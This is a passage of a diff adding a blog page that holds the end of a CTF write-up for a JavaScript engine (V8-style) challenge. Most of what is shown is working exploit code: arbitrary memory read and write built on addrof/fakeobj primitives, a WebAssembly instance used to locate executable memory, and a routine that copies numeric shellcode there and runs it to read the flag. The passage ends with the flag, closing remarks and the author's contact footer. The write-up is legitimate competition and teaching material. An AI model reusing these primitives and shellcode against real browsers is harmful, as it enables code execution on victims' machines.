+  <span class="k">if</span> <span class="p">(</span><span class="nx">addr</span> <span class="o">%</span> <span class="mi">2</span><span class="nx">n</span> <span class="o">==</span> <span class="mi">0</span><span class="nx">n</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">addr</span> <span class="o">=</span> <span class="nx">addr</span> <span class="o">+</span> <span class="mi">1</span><span class="nx">n</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="nx">a</span><span class="p">[</span><span class="mi">20</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">addr</span><span class="p">);</span>
+
+  <span class="k">return</span> <span class="nx">to_modifie</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">address</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kd">let</span> <span class="nx">y</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="nx">itof</span><span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">double_float_array_map</span><span class="p">)),</span>
+    <span class="nx">itof</span><span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="mh">0x20000000000</span><span class="nx">n</span> <span class="o">|</span> <span class="p">(</span><span class="nx">address</span> <span class="o">-</span> <span class="mi">8</span><span class="nx">n</span><span class="p">))),</span>
+    <span class="mf">3.3</span><span class="p">,</span>
+  <span class="p">];</span>
+
+  <span class="kd">let</span> <span class="nx">fake</span> <span class="o">=</span> <span class="nx">fakeobj</span><span class="p">(</span><span class="nx">addrof</span><span class="p">(</span><span class="nx">y</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x18</span><span class="nx">n</span><span class="p">);</span>
+  <span class="k">return</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">fake</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">arb_write</span><span class="p">(</span><span class="nx">address</span><span class="p">,</span> <span class="nx">val</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kd">let</span> <span class="nx">y</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="nx">itof</span><span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">double_float_array_map</span><span class="p">)),</span>
+    <span class="nx">itof</span><span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="mh">0x20000000000</span><span class="nx">n</span> <span class="o">|</span> <span class="p">(</span><span class="nx">address</span> <span class="o">-</span> <span class="mi">8</span><span class="nx">n</span><span class="p">))),</span>
+    <span class="mf">3.3</span><span class="p">,</span>
+  <span class="p">];</span>
+  <span class="nx">fake</span> <span class="o">=</span> <span class="nx">fakeobj</span><span class="p">(</span><span class="nx">addrof</span><span class="p">(</span><span class="nx">y</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x18</span><span class="nx">n</span><span class="p">);</span> <span class="c1">// now fake elemnts point to address-8</span>
+  <span class="nx">fake</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">val</span><span class="p">;</span>
+  <span class="k">return</span> <span class="nx">fake</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+<span class="p">}</span>
+
+<span class="kd">var</span> <span class="nx">wasm_code</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">([</span>
+  <span class="mi">0</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">115</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">133</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">96</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">127</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span>
+  <span class="mi">130</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">132</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">112</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">131</span><span class="p">,</span>
+  <span class="mi">128</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">129</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">145</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span>
+  <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> <span class="mi">111</span><span class="p">,</span> <span class="mi">114</span><span class="p">,</span> <span class="mi">121</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">110</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span>
+  <span class="mi">138</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">132</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">65</span><span class="p">,</span> <span class="mi">42</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span>
+<span class="p">]);</span>
+<span class="kd">var</span> <span class="nx">wasm_mod</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Module</span><span class="p">(</span><span class="nx">wasm_code</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">wasm_instance</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Instance</span><span class="p">(</span><span class="nx">wasm_mod</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">fa</span> <span class="o">=</span> <span class="nx">wasm_instance</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">main</span><span class="p">;</span>
+
+<span class="nx">addr_</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">wasm_instance</span><span class="p">);</span>
+<span class="kd">let</span> <span class="nx">trusted_data</span> <span class="o">=</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">addr_</span> <span class="o">+</span> <span class="mh">0xc</span><span class="nx">n</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">;</span>
+<span class="kd">let</span> <span class="nx">rwx</span> <span class="o">=</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">trusted_data</span> <span class="o">+</span> <span class="mh">0x30</span><span class="nx">n</span><span class="p">);</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">rwx : </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">rwx</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+
+<span class="kd">function</span> <span class="nx">copy_shellcode</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">shellcode</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kd">let</span> <span class="nx">buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">ArrayBuffer</span><span class="p">(</span><span class="mh">0x100</span><span class="p">);</span>
+  <span class="kd">let</span> <span class="nx">dataview</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">DataView</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
+  <span class="kd">let</span> <span class="nx">buf_addr</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
+  <span class="kd">let</span> <span class="nx">backing_store_addr</span> <span class="o">=</span> <span class="nx">buf_addr</span> <span class="o">+</span> <span class="mh">0x24</span><span class="nx">n</span><span class="p">;</span>
+  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">buf 0x</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">buf_addr</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">backing store 0x</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">backing_store_addr</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+
+  <span class="c1">//arb_write(backing_store_addr, itof(addr));</span>
+  <span class="nx">arb_write</span><span class="p">(</span><span class="nx">backing_store_addr</span><span class="p">,</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">addr</span><span class="p">));</span>
+
+  <span class="c1">//Breakpoint();</span>
+  <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">shellcode</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">dataview</span><span class="p">.</span><span class="nx">setUint32</span><span class="p">(</span><span class="mi">4</span> <span class="o">*</span> <span class="nx">i</span><span class="p">,</span> <span class="nx">shellcode</span><span class="p">[</span><span class="nx">i</span><span class="p">],</span> <span class="kc">true</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kd">var</span> <span class="nx">shellcode</span> <span class="o">=</span> <span class="p">[</span>
+  <span class="mi">46188360</span><span class="p">,</span> <span class="mi">1207959552</span><span class="p">,</span> <span class="mi">50887</span><span class="p">,</span> <span class="mi">3343384576</span><span class="p">,</span> <span class="mi">194</span><span class="p">,</span> <span class="mi">1032669184</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">2303198479</span><span class="p">,</span>
+  <span class="mi">3867756743</span><span class="p">,</span> <span class="mi">1354942280</span><span class="p">,</span> <span class="mi">1207959552</span><span class="p">,</span> <span class="mi">49351</span><span class="p">,</span> <span class="mi">84869120</span><span class="p">,</span> <span class="mi">29869896</span><span class="p">,</span> <span class="mi">1207959552</span><span class="p">,</span>
+  <span class="mi">3343443593</span><span class="p">,</span> <span class="mi">20674</span><span class="p">,</span> <span class="mi">3234285568</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1818625295</span><span class="p">,</span> <span class="mi">1949198177</span><span class="p">,</span> <span class="mi">29816</span><span class="p">,</span>
+<span class="p">];</span>
+<span class="nx">copy_shellcode</span><span class="p">(</span><span class="nx">rwx</span><span class="p">,</span> <span class="nx">shellcode</span><span class="p">);</span>
+
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[+] ORW flag</span><span class="dl">"</span><span class="p">);</span>
+<span class="nx">fa</span><span class="p">();</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="se">\n</span><span class="dl">"</span><span class="p">);</span>
+</code></pre></div></div>
+
+<hr />
+
+<p>Reaching the end of this writeup , i hope you enjoyed or learnt a thing or 2 . Hope you also liked our CTF despite the bit of oopsies that happened . All our team did it’s best .<br />
+also dont forget to vote for the weight at <a href="https://ctftime.org/event/2884/weight">ctftime</a></p>
+
+<p>May we meet at the finals &lt;3</p>
+
+<p><strong>Securinets{come_to_tunisia_habibi}</strong></p>
+
+<p>also i’m looking for a research/exploit-dev internship so if you know some lab or org looking for juniors hit me up (i’m this desperate 😭😭) . I would appreciate it</p>
+
+</article>
+
+            </main><footer>
+    <div class="window-container">
+        <div class="window">
+            <div class="contacts">
+                <p><a href="https://github.com/buddurid">Github</a></p>
+                <p><a href="mailto:bbahae624@gmail.com">Email</a></p>
+                <p><a href="https://x.com/buddurid">Twitter</a></p>
+                <p><a href="https://www.linkedin.com/in/bahae-bahrini/">LinkedIn</a></p>
+                <p><a href="">Discord:#buddurid</a></p>
+                <p><a href="">CTFTime</a></p>
+            </div>
+            <p>©2024    Buddurid</p>
+            <p>Hosted on <a href="https://github.com/buddurid/buddurid.github.io/">GitHub Pages.</a></p>
+        </div>
+    </div>
+    <script src="/assets/footer-fix.js"></script>
+</footer>
+</div>
+    </body>
+</html>
